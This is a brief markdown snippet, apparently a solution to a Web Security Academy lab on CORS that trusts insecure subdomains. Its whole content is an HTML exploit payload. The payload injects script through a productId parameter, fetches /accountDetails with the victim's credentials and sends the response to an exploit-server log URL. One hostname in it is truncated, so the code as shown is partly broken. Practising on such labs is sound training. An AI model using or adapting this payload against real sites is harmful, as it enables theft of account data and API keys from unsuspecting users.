## CORS trusting vulnerable websites: 

```html
<script>
    window.location= "stock.0a12006a030384488461b9a500bb006b.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','https://.web-security-academy.net/accountDetails',true);req.withCredentials = true;req.send();function reqListener() {location='exploit-0a4b005203a5e12b8028846801ba0011.exploit-server.net/log?key='+this.responseText;};</script>&storeId=1"
</script>
```